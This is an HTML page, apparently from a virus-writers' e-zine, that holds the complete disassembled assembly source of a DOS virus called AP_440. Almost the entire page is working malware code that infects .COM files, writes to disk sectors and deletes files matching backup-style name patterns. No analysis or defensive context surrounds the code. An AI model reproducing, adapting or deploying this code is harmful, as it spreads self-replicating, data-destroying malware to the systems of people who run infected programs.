<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>AP_440</strong></font></p>

<p align="left"><font color="#00FFFF"><strong>;
--------------------------------------------------------------------------<br>
; Disassembled by FairWind / NRG , nrgteam@mail.ru<br>
;
--------------------------------------------------------------------------</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>code segment<br>
assume cs:code, ds:code<br>
<br>
org 100<br>
<br>
v_const = 2042d<br>
<br>
start:<br>
jmp v_entry<br>
db 0CA<br>
db (2048d - 9) dup (90)<br>
<br>
mov ax,4C00<br>
int 21<br>
<br>
v_start label byte<br>
first4 db 0E9, 0F8, 7, 90<br>
allcom db '*.COM', 0<br>
<br>
mydta label byte<br>
reserve db 15 dup (?)<br>
attrib db ?<br>
time dw ?<br>
date dw ?<br>
fsize dd ?<br>
namez db 14d dup (?)<br>
<br>
allp db 0, '????????P??'<br>
allbak db 0, '????????BAK'<br>
maxdrv db ?<br>
sign db 'ICS 89'<br>
<br>
v_entry:<br>
push ax<br>
push dx<br>
<br>
mov ah,19<br>
int 21<br>
push ax<br>
mov ah,0E<br>
mov dl,al<br>
int 21<br>
<br>
call self<br>
self:<br>
pop si<br>
sub si,offset self-v_const<br>
mov byte ptr [si+offset maxdrv-v_const],al<br>
mov ax,[si+offset first4-v_const]<br>
mov word ptr ds:[offset start],ax<br>
mov ax,[si+offset first4+2-v_const]<br>
mov word ptr ds:[offset start+2],ax<br>
<br>
mov ah,1A<br>
lea dx,[si+offset mydta-v_const]<br>
int 21<br>
<br>
pop ax<br>
push ax<br>
<br>
call inf_drive<br>
xor al,al<br>
drv_lp:<br>
call inf_drive<br>
jbe drv_lp<br>
pop ax<br>
mov ah,0E<br>
mov dl,al<br>
int 21<br>
<br>
mov dx,80<br>
mov ah,1A<br>
int 21<br>
<br>
mov si,offset start<br>
pop dx<br>
pop ax<br>
jmp si<br>
<br>
inf_drive:<br>
push ax<br>
mov ah,0E<br>
mov dl,al<br>
int 21<br>
pop ax<br>
<br>
push ax<br>
push bx<br>
push cx<br>
push si<br>
<br>
mov cx,1<br>
xor dx,dx<br>
lea bx,[si+offset v_end-v_const]<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
int 25<br>
pop dx<br>
pop dx<br>
pop cx<br>
pop bx<br>
jc bad_drv<br>
<br>
inc byte ptr [bx]<br>
cmp byte ptr [bx+1],6F<br>
jne wr_drive<br>
bad_drv:<br>
pop ax<br>
pop si<br>
drv_xit:<br>
pop cx<br>
pop bx<br>
pop ax<br>
<br>
inc al<br>
cmp al,[si+offset maxdrv-v_const]<br>
ret<br>
<br>
wr_drive:<br>
pop ax<br>
int 26<br>
pop ax<br>
pop si<br>
jc drv_xit<br>
mov ah,4E<br>
xor cx,cx<br>
lea dx,[si+offset allcom-v_const]<br>
next:<br>
int 21<br>
jc no_more<br>
lea dx,[si+offset namez-v_const]<br>
call infect<br>
mov ah,4F<br>
jc next<br>
jmp drv_xit<br>
<br>
no_more:<br>
lea di,[si+offset v_end-v_const]<br>
cmp byte ptr [di],'Z'<br>
jb drv_xit<br>
<br>
mov ah,13<br>
lea dx,[si+offset allp-v_const]<br>
int 21<br>
cmp al,-1<br>
je drv_xit<br>
<br>
mov ah,13<br>
lea dx,[si+offset allbak-v_const]<br>
int 21<br>
<br>
jmp drv_xit<br>
namaddr dw ?<br>
<br>
infect:<br>
mov [si+offset namaddr-v_const],dx<br>
<br>
mov ax,4301<br>
xor cx,cx<br>
int 21<br>
jnc inf_cont<br>
inf_xit:<br>
ret<br>
<br>
inf_cont:<br>
mov ax,3D02<br>
int 21<br>
jc inf_xit<br>
mov bx,ax<br>
<br>
mov cx,4<br>
mov ah,3F<br>
lea di,[si+offset first4-v_const]<br>
mov dx,di<br>
int 21<br>
jc quit<br>
<br>
cmp byte ptr [di+3],0CA<br>
stc<br>
jz quit<br>
<br>
mov cx,[si+offset fsize-v_const]<br>
cmp cx,2048d<br>
jb quit<br>
cmp cx,64000d<br>
stc<br>
ja quit<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax,4202<br>
int 21<br>
push ax<br>
jc quit<br>
mov cx,v_end-v_start<br>
nop<br>
lea dx,[si+offset v_start-v_const]<br>
mov ah,40<br>
int 21<br>
jc quit<br>
pop ax<br>
add ax,v_entry-v_start-3<br>
mov byte ptr [di],0E9<br>
mov [di+1],ax<br>
mov byte ptr [di+3],0CA<br>
</strong></font><font color="#FFFFFF"><strong>xor cx,cx<br>
xor dx,dx<br>
mov ax,4200<br>
int 21<br>
jc quit<br>
<br>
mov cx,4<br>
mov dx,di<br>
mov ah,40<br>
int 21<br>
<br>
quit:<br>
pushf<br>
<br>
mov ax,5701<br>
mov cx,[si+offset time-v_const]<br>
mov dx,[si+offset date-v_const]<br>
int 21<br>
<br>
mov ah,3E<br>
int 21<br>
<br>
mov ax,4301<br>
mov cl,[si+offset attrib-v_const]<br>
xor ch,ch<br>
mov dx,[si+offset namaddr-v_const]<br>
int 21<br>
<br>
popf<br>
ret<br>
<br>
v_end equ $<br>
<br>
code ends<br>
end start</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../Images/coollogo_com_21259199.jpg" border="0" width="518"
height="56"></a></p>
</body>
</html>
